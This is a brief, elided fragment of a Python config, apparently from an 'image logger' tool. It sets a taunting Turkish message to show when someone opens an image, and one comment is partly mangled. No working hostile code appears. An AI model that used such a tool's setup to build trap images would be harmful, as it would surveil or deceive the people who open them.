...
config = {
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "Hadi Kolay Gelsin Tarayıcınızın anasi ağladı", # Message to show
    ...
    # NOTE: Hierarchy tr iki ee goes as follows:
